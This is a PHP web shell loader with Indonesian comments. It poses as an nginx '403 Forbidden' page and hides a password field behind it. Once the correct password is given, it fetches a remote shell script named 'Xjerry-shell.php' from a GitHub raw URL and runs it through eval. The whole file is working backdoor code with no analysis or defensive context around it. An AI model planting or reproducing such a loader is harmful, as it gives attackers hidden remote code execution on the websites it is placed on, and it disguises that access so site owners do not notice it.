<?php
$auth_pass = "31c95b07087222791e3f184e34d13a898b93485f37db57efbc9ba425d80aaa3c";

function Login() {
    die("<html>
    <title>403 Forbidden</title>
    <center><h1>403 Forbidden</h1></center>
    <hr><center>nginx (apache v.168 ./jerry_sys) </center>
    <center><form method='post'><input style='text-align:center;margin:0;margin-top:0px;background-color:#fff;border:1px solid #fff;' type='password' name='pass'></form></center>");
}

function VEsetcookie($k, $v) {
    $_COOKIE[$k] = $v;
    setcookie($k, $v);
}
function fetchRemoteContent($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10); // Timeout 10 detik
    $content = curl_exec($ch);
    if (curl_errno($ch)) {
        // Menangani kesalahan jika ada
        error_log('Error fetching remote content: ' . curl_error($ch));
        curl_close($ch);
        return false;
    }
    curl_close($ch);
    return $content;
}

// Memeriksa apakah pengguna sudah login
function is_logged_in() {
    global $auth_pass;
    return isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) && ($_COOKIE[md5($_SERVER['HTTP_HOST'])] == $auth_pass);
}

// Memeriksa apakah pengguna sudah login
if (is_logged_in()) {
    // Jika sudah login, ambil konten dari URL eksternal dan evaluasi sebagai PHP script
    $a = fetchRemoteContent('https://raw.githubusercontent.com/munz666/scriptshelll/main/Xjerry-shell.php');
    if ($a !== false) {
        eval('?>' . $a);
    } else {
        // Jika gagal mengambil konten dari URL eksternal
        die('Failed to fetch remote content.');
    }
} else {
    // Jika belum login, tampilkan form login
    if (isset($_POST['pass']) && (hash('sha256', $_POST['pass']) == $auth_pass)) {
        VEsetcookie(md5($_SERVER['HTTP_HOST']), $auth_pass);
    }
    if (!is_logged_in()) {
        Login();
    }
}
?>